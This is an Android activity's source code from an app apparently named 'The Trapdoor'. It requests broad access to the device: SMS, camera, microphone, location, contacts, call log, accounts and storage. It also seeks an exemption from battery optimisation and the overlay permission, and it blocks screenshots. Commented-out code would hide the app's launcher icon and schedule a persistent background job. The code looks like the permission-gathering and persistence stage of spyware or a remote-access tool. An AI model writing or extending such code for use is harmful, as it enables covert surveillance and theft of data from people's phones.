package com.leonteqsecurity.thetrapdoor.Activity;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;

import java.util.ArrayList;
import java.util.List;
import android.Manifest;
import android.view.WindowManager;
import android.widget.Toast;

import com.leonteqsecurity.thetrapdoor.R;

public class MainActivity extends AppCompatActivity {
    private static final int JOB_ID = 123;
    private static final int PERMISSIONS_REQUEST_CODE = 1;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);


        if(getSupportActionBar()!=null)
        {
            getSupportActionBar().hide();
        }
    }




    public void hideApplication(View view)
    {
//        PackageManager p = getPackageManager();
//        ComponentName componentName = new ComponentName(this, MainActivity.class);
//        int newState = p.getComponentEnabledSetting(componentName) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
//                ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
//                : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
//        p.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP);

//        Intent intent = new Intent(this,registerSuccess.class);
//        startActivity(intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        }




//        Intent serviceIntent = new Intent(this, MyService.class);
//        startService(serviceIntent);


////        joschedulers
//        // Create the job info object
//        JobInfo jobInfo = new JobInfo.Builder(JOB_ID, new ComponentName(this, MyJobService.class))
//                .setPersisted(true)
//                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
//                .build();
//
//        // Schedule the job
//        JobScheduler jobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
//        jobScheduler.schedule(jobInfo);



        System.out.println("hello leon");
    }


    public  void startAndCheckPermission(View view)
    {
        checkPermissions();

    }






    private void checkPermissions() {
        String[] permissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.READ_CALENDAR,
                Manifest.permission.WRITE_CALENDAR,
                Manifest.permission.READ_CALL_LOG,
//                Manifest.permission.MANAGE_EXTERNAL_STORAGE,



        };

        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), PERMISSIONS_REQUEST_CODE);

        }else
        {
            Toast.makeText(this, "This is awesome", Toast.LENGTH_SHORT).show();
            if (!Settings.canDrawOverlays(getApplicationContext())) {
                startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION));
            }else
            {
                Intent intent = new Intent(this,Dashboard.class);
                startActivity(intent);
            }


        }


    }
    // Handle the permission request result
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Permission denied: " + permissions[i], Toast.LENGTH_LONG).show();
                }
            }
        }
    }
}